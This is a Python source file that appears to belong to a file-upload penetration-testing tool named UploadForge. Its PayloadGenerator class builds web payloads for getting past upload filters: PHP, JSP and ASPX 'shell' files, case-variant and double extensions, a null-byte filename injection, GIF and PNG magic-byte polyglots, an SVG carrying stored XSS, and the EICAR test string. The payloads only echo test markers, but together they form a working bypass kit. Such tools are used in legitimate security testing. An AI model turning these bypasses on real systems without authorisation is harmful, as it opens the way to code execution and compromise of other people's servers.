import os
from typing import List, Dict, Tuple
from ..utils.helpers import generate_random_string

class PayloadGenerator:
    """
    Generates various file upload payloads including polyglots, magic bytes, and extension bypasses.
    """
    
    def __init__(self):
        self.payloads = []

    def get_simple_php_payload(self) -> Tuple[str, bytes]:
        """Returns filename, content"""
        content = b"<?php echo 'UploadForge_Test_Success_' . (23 * 2); ?>"
        return "shell.php", content

    def get_simple_jsp_payload(self) -> Tuple[str, bytes]:
        content = b"<% out.println(\"UploadForge_Test_Success_\" + (23 * 2)); %>"
        return "shell.jsp", content
    
    def get_simple_aspx_payload(self) -> Tuple[str, bytes]:
        content = b"<%@ Page Language=\"C#\" %> <% Response.Write(\"UploadForge_Test_Success_\" + (23 * 2)); %>"
        return "shell.aspx", content

    def get_eicar_test_file(self) -> Tuple[str, bytes]:
        content = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        return "eicar.com.txt", content

    def get_xss_svg_payload(self) -> Tuple[str, bytes]:
        content = b"""<svg xmlns="http://www.w3.org/2000/svg" onload="alert('UploadForge')"></svg>"""
        return "image.svg", content
    
    def get_polyglot_gif_php(self) -> Tuple[str, bytes]:
        # Minimal GIF header + PHP payload
        content = b"GIF89a" + b"<?php echo 'UploadForge_GIF_Polyglot'; ?>"
        return "logo.gif.php", content
        
    def get_magic_byte_payload(self, ext: str, magic_bytes: bytes) -> bytes:
        return magic_bytes + b"<?php echo 'UploadForge_Magic_Bytes'; ?>"

    def generate_all_payloads(self) -> List[Dict]:
        """
        Returns a list of payload dictionaries with metadata.
        """
        payloads = []
        
        # 1. Standard Shells
        payloads.append({"type": "php_shell", "ext": "php", "content": self.get_simple_php_payload()[1], "desc": "Standard PHP Shell"})
        payloads.append({"type": "jsp_shell", "ext": "jsp", "content": self.get_simple_jsp_payload()[1], "desc": "Standard JSP Shell"})
        payloads.append({"type": "aspx_shell", "ext": "aspx", "content": self.get_simple_aspx_payload()[1], "desc": "Standard ASPX Shell"})
        
        # 2. Case Sensitivity Bypasses
        php_variants = ["pHp", "PHP", "php5", "phtml", "php7"]
        for ext in php_variants:
             payloads.append({
                 "type": f"php_variant_{ext}", 
                 "ext": ext, 
                 "content": self.get_simple_php_payload()[1], 
                 "desc": f"PHP Variant .{ext}"
             })

        # 3. Double Extensions
        base_name = "shell"
        double_exts = [
            ("php", "jpg"), ("php", "png"), ("php", "gif"),
            ("jsp", "jpg"), ("asp", "txt")
        ]
        
        for malicious, safe in double_exts:
            # shell.php.jpg
            payloads.append({
                "type": f"double_ext_{malicious}_{safe}",
                "ext": f"{malicious}.{safe}", # This might need handling in upload logic to not append another dot
                "filename": f"{base_name}.{malicious}.{safe}",
                "content": self.get_simple_php_payload()[1] if malicious == "php" else b"test",
                "desc": f"Double Extension .{malicious}.{safe}"
            })
            # shell.jpg.php
            payloads.append({
                "type": f"double_ext_{safe}_{malicious}",
                "ext": f"{safe}.{malicious}",
                "filename": f"{base_name}.{safe}.{malicious}",
                "content": self.get_simple_php_payload()[1] if malicious == "php" else b"test",
                "desc": f"Double Extension .{safe}.{malicious}"
            })
            
        # 4. Null Byte Injection (Old PHP versions but still relevant)
        payloads.append({
            "type": "null_byte_injection",
            "ext": "php",
            "filename": "shell.php%00.jpg",
            "content": self.get_simple_php_payload()[1],
            "desc": "Null Byte Injection shell.php%00.jpg"
        })

        # 5. Magic Bytes / Polyglots
        # GIF89a
        payloads.append({
             "type": "polyglot_gif",
             "ext": "php",
             "filename": "logo.gif.php",
             "content": self.get_polyglot_gif_php()[1],
             "desc": "GIF89a Polyglot"
        })
        
        # PNG Magic Bytes
        png_magic = b"\x89PNG\r\n\x1a\n"
        payloads.append({
             "type": "magic_png",
             "ext": "php",
             "filename": "image.php", # Trying to pass as image content
             "content": self.get_magic_byte_payload("php", png_magic),
             "desc": "Fake PNG Magic Bytes + PHP"
        })

        # 6. XSS
        payloads.append({"type": "xss_svg", "ext": "svg", "content": self.get_xss_svg_payload()[1], "desc": "Stored XSS via SVG"})
        
        # 7. EICAR
        payloads.append({"type": "eicar", "ext": "txt", "content": self.get_eicar_test_file()[1], "desc": "EICAR Test File"})

        return payloads
